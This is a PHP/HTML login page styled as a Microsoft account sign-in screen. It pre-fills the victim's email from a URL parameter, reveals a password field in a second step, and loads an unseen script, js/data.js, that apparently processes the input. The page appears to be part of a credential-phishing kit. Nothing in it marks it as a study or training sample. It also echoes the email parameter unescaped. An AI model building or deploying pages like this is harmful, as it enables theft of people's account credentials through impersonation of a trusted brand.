<?php
    if(isset($_GET['email'])){
        $email = $_GET['email'];
    }
?>
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Login into your microsoft account</title>
	<link rel="icon" type="icon" href="logo.PNG">
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
	<style type="text/css">
		body{
			background:#fff;
			background: url('bg1.jpg');
			background-size: cover;
			background-repeat: no-repeat;
		}

		.container{
			width:100%;
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
		}

		.office{
			width: 450px;
			background: #fff;
		}

		.office-holder{
			width:80%;
			margin: auto;
			padding: 20px 0px;
		}

		.logo{
			width:100%;
			float: left;
			margin:1em 0;
		}

		.logo h1{
			font-family: arial;
		}

		.form-holder{
			width:100%;
			float: left;
		}

		.form-holder h3{
			font-weight: 600;
		}

		.form-holder input[type='email'], input[type='password']{
			width: 100%;
			height:40px;
			border:none;
			border-bottom:1px solid #778787;
			float: left;
			margin-bottom: 5px;
		}
		.form-holder .btn-holder{
			width:100%;
			float: left;
			margin-top:2em;
		}

		.form-holder .btn-holder .btn{
			background:#0073C6;
			border:none;
			padding:6px 10px;
			color:#fff;
		}

		.form-holder .btn-holder .btn:hover{
			cursor:pointer;
		}

		.checkbox{
			width: 100%;
			float: left;
			margin-top:5px;
		}

		.checkbox label{
			font-family:arial;
			font-size:13px;
			float: left;
			margin-left:1em;
		}

		.hide{
			display: none;
		}
	</style>
</head>
<body>
	<div class="container">
		<div class="office" id="office">
			<div class="office-holder">
				<div class="logo">
					<img src="microsoft.svg">
				</div>
				<form>
					<div class="form-holder">
						<h3>Sign in</h3>
						<div style="width: 100%;">
							<p style="color: red; margin:0" class="alert2 hide">Enter a valid email address, phone number, or Skype name.</p>
						</div>
						<input id="email" type="email" oninput="checkMail()" name="email" placeholder="Email, phone, or Skype" required="" value="<?php echo $email; ?>" class="show">
						<input id="password" type="password" name="password" placeholder="Password" required="" class="hide">
						<p style=" font-size:15px; color:#0073C6; margin-top:1em; float: left; width: 100%;"><span style="color:#000;">No account?</span> Create one!</p>
						<p style="font-size:15px; color:#0073C6;">can't access your account?</p>
						<p style="font-size:15px; color:#0073C6;">Sign-in options</p>

						<div class="btn-holder" style="margin-bottom: 40px">
							<button class="btn" id="next" style="float:right; width:120px; border-radius:0px">Next</button>
							<button class="btn hide" id="signin" style="float:right; width:120px; border-radius:0px">Sign in</button>
						</div>
					</div>
				</form>
			</div>
		</div>
	</div>
	<script src="vendor/jquery/jquery-2.2.3.min.js"></script>
	<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
	<script src="js/data.js"></script>
</body>
</html>